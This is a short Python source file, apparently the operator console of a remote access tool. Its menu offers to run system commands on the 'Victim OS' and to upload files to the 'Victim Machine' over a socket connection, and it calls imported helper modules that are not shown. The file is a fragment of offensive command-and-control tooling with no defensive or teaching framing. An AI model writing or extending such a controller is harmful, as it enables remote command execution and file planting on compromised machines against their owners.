from serverCore.command import runCommand
from serverCore.fileUpload import upload_files

def showOptions():
    print("\n")
    print("\t\t [ 01 ] Run Command(CMD) on Victim OS")
    print("\t\t [ 02 ] Upload File to the Victim Machine")
    print("\t\t [ Q ] Exit")


def handleConnection(serverSocket):
    print("[+] Handling Client Connection")    
    
    while True:
        showOptions()
        user_input = input("[+] Select your options: ")
        # Create function that handle command execution 
        
        serverSocket.SendData(user_input)
        if user_input == "1":
            print("[+] Running the system command on victim")
            runCommand(serverSocket)
        elif user_input == "2":
            # Upload file
            print("Uploading file to the Victim Machine")
            upload_files(serverSocket)
        elif user_input.lower() == 'q':
            break
        else:
            print("[+] Invalid input")